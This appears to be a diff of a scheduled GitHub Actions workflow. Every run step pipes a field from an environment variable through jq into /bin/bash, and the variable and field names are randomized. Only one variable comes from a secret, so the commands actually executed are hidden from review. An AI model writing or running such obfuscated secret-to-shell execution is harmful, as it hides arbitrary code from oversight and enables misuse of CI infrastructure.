@@ -1,26 +1,28 @@
 name: hepingacm
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
-jobs:  # 30562
+    - cron: '38 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hepingacm
         env:
-          xzbl2: ${{ secrets.xzbl2 }}
+          hp0311: ${{ secrets.hp0311 }}
         run: |
-          echo $xzbl2 | jq -r .pah38097 | /bin/bash
-          echo $puec681 | jq -r .c0 | /bin/bash
-          echo $il39 | jq -r .x196 | /bin/bash
-          echo $sqvx008 | jq -r .tk0352 | /bin/bash
-          echo $r81053 | jq -r .wplv4 | /bin/bash
-          echo $rak82540 | jq -r .pxk8452 | /bin/bash
-          echo $twekf48 | jq -r .wou2 | /bin/bash
-          echo $yn42098 | jq -r .ngnub96 | /bin/bash
-          echo $w0855 | jq -r .s3906 | /bin/bash
-          echo $m838 | jq -r .tp18115 | /bin/bash
+          echo $hp0311 | jq -r .qzd8716 | /bin/bash
+          echo $lx78527 | jq -r .snof885 | /bin/bash
+          echo $hmhos3 | jq -r .dyzz8 | /bin/bash
+          echo $lnp5 | jq -r .f21121 | /bin/bash
+          echo $vvnp6824 | jq -r .l98861 | /bin/bash
+          echo $kcty636 | jq -r .ax97 | /bin/bash
+          echo $imhjq9670 | jq -r .kgerl5 | /bin/bash
+          echo $jogm65266 | jq -r .irm962 | /bin/bash
+          echo $rir71846 | jq -r .uh66118 | /bin/bash
+          echo $ebznc1277 | jq -r .qntas62177 | /bin/bash
+          echo $dkq0 | jq -r .lrudh81966 | /bin/bash
+          echo $t626 | jq -r .s5 | /bin/bash
 
